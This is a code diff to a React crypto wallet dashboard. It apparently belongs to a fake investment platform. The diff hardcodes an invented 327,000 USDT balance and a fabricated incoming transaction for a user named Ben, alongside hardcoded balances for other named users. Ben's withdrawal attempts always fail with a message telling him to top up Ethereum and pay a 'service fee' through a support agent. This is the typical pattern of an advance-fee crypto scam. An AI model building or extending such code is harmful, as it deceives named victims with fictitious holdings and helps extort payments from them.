@@ -53,12 +53,15 @@ const WalletDashboard = ({ onLogout, userData }: WalletDashboardProps) => {
   // USDT balances
   const janUsdtBalance = isJan ? 3017088.35 : 0;
   const jeremyUsdtBalance = isJeremy ? 74708.23 : 0;
+  const benUsdtBalance = isBen ? 327000 : 0;
   const usdtPrice = 1; // USDT is pegged to $1
   
   const usdValue = isJan ? 
     (cryptoBalance * currentPrice) + (janUsdtBalance * usdtPrice) : 
     isJeremy ?
     (cryptoBalance * currentPrice) + (jeremyUsdtBalance * usdtPrice) :
+    isBen ?
+    (cryptoBalance * currentPrice) + (benUsdtBalance * usdtPrice) :
     cryptoBalance * currentPrice;
 
   // Fetch real crypto prices
@@ -181,7 +184,17 @@ const WalletDashboard = ({ onLogout, userData }: WalletDashboardProps) => {
     }
   ];
 
-  const benTransactions: any[] = [];
+  const benTransactions = [
+    { 
+      id: "1", 
+      type: "received", 
+      amount: 327000, 
+      date: new Date().toISOString().split('T')[0], 
+      time: new Date(Date.now() + (4 * 60 * 60 * 1000)).toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit' }),
+      hash: "0xB1c2d3...",
+      symbol: "USDT"
+    }
+  ];
   
   const transactions = isJoanne ? joanneTransactions : isJan ? janTransactions : isJeremy ? jeremyTransactions : isBen ? benTransactions : dorothyTransactions;
 
@@ -227,6 +240,14 @@ const WalletDashboard = ({ onLogout, userData }: WalletDashboardProps) => {
       toast({
         title: "Insufficient ethereum for gas fees",
         description: "Please top up to proceed.",
+        variant: "destructive",
+      });
+      setIsSendDialogOpen(false);
+    } else if (isBen) {
+      // For Ben, show specific error message about gas fees and support agent
+      toast({
+        title: "Please top up Ethereum for gas fees",
+        description: "Contact your support agent for the service fee",
         variant: "destructive",
       });
       setIsSendDialogOpen(false);
@@ -297,6 +318,20 @@ const WalletDashboard = ({ onLogout, userData }: WalletDashboardProps) => {
                       </p>
                       <p className="text-2xl font-bold text-primary">
                         {jeremyUsdtBalance.toLocaleString('en-US', { minimumFractionDigits: 2 })} USDT
+                      </p>
+                    </div>
+                    <p className="text-xl text-muted-foreground mt-2">
+                      ${usdValue.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} USD
+                    </p>
+                  </>
+                ) : isBen ? (
+                  <>
+                    <div className="space-y-2">
+                      <p className="text-2xl font-bold text-primary">
+                        {cryptoBalance} {cryptoSymbol}
+                      </p>
+                      <p className="text-2xl font-bold text-primary">
+                        {benUsdtBalance.toLocaleString('en-US', { minimumFractionDigits: 2 })} USDT
                       </p>
                     </div>
                     <p className="text-xl text-muted-foreground mt-2">
@@ -488,6 +523,36 @@ const WalletDashboard = ({ onLogout, userData }: WalletDashboardProps) => {
                     value={sendAmount}
                     onChange={(e) => setSendAmount(e.target.value)}
                     placeholder="Enter amount to withdraw"
+                    type="number"
+                    step="0.01"
+                    className="mt-1"
+                  />
+                </div>
+                <Button 
+                  onClick={handleSendSubmit}
+                  className="w-full"
+                  disabled={!sendAddress || !sendAmount}
+                >
+                  Send
+                </Button>
+              </div>
+            ) : isBen ? (
+              <div className="space-y-4">
+                <div>
+                  <label className="text-sm font-medium text-muted-foreground">USDT Address</label>
+                  <Input
+                    value={sendAddress}
+                    onChange={(e) => setSendAddress(e.target.value)}
+                    placeholder="Enter destination USDT address"
+                    className="mt-1"
+                  />
+                </div>
+                <div>
+                  <label className="text-sm font-medium text-muted-foreground">Amount (USDT)</label>
+                  <Input
+                    value={sendAmount}
+                    onChange={(e) => setSendAmount(e.target.value)}
+                    placeholder="Enter amount to send"
                     type="number"
                     step="0.01"
                     className="mt-1"
